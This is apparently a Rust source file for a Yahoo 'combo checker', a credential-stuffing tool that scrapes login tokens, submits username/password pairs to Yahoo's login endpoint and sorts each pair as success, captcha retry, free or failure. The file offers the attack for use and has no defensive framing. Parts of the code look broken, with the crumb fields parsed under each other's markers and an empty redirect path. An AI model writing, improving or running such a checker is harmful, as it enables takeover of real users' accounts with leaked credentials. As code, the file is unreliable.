mod static_keys;

#[derive(Debug)]
pub enum CheckerStatus {
    Success,
    Free,
    Retry,
    Failure,
}

#[derive(Debug)]
pub struct Combo {
    pub username: String,
    pub password: String,
}

#[derive(Debug)]
struct SourceData<'a> {
    crumb: &'a str,
    acrumb: &'a str,
    session_index: &'a str,
}

#[derive(Debug)]
pub struct Checker {
    client: reqwest::Client,
}

impl Checker {
    pub fn new() -> Checker {
        Checker {
            client: reqwest::Client::new(),
        }
    }

    pub async fn check_combo(
        &self,
        combo: &Combo,
    ) -> Result<CheckerStatus, Box<dyn std::error::Error>> {
        let response = self.initial_request().await?;
        let data = get_source_data(&response);

        let response = self
            .post_request(yahoo_post_url(static_keys::YAHOO_POST, data, combo))
            .await?;

        if response.contains("captcha") {
            return Ok(CheckerStatus::Retry);
        }

        if !response.contains("challenge/password") {
            return Ok(CheckerStatus::Failure);
        }

        let loc = "";

        let response = self
            .post_request(format!("https://login.yahoo.com{}", loc))
            .await?;

        if response.contains("https://api.login.yahoo.com/oauth2/") {
            return Ok(CheckerStatus::Success);
        }

        if response.contains("selector") {
            return Ok(CheckerStatus::Free);
        }

        Ok(CheckerStatus::Failure)
    }

    async fn initial_request(&self) -> Result<String, Box<dyn std::error::Error>> {
        let initial_request = self
            .client
            .request(reqwest::Method::GET, static_keys::YAHOO_LOGIN)
            .headers(get_header_map(Vec::from(static_keys::YAHOO_LOGIN_HEADERS))?)
            .build()?;
        Ok(self.client.execute(initial_request).await?.text().await?)
    }

    async fn post_request(&self, url: String) -> Result<String, Box<dyn std::error::Error>> {
        let post_request = self
            .client
            .request(reqwest::Method::POST, url)
            .body(static_keys::YAHOO_POST_CONTENT)
            .headers(get_header_map(Vec::from(static_keys::YAHOO_POST_HEADERS))?)
            .build()?;
        Ok(self.client.execute(post_request).await?.text().await?)
    }
}

fn get_source_data(response: &String) -> SourceData {
    SourceData {
        crumb: parse_source(response, "acrumb\" value=\""),
        acrumb: parse_source(response, "name=\"crumb\" value=\""),
        session_index: parse_source(response, "\"sessionIndex\" value=\""),
    }
}

fn get_header_map(
    headers: Vec<&'static str>,
) -> Result<reqwest::header::HeaderMap, Box<dyn std::error::Error>> {
    let mut header_map = reqwest::header::HeaderMap::new();
    for header in headers {
        let header = header.split(": ").collect::<Vec<&'static str>>();
        (&mut header_map).insert(header[0], header[1].parse()?);
    }
    Ok(header_map)
}

fn parse_source<'a>(source: &'a String, lstr: &str) -> &'a str {
    let start = source.find(lstr).unwrap() + lstr.len();
    let end = source[start..].find("\"").unwrap();
    &source[start..start + end]
}

fn yahoo_post_url(url: &str, data: SourceData, combo: &Combo) -> String {
    url.replace("<ac>", data.acrumb)
        .replace("<c>", data.crumb)
        .replace("<si>", data.session_index)
        .replace("<USER>", &combo.username)
        .replace("<PASS>", &combo.password)
}
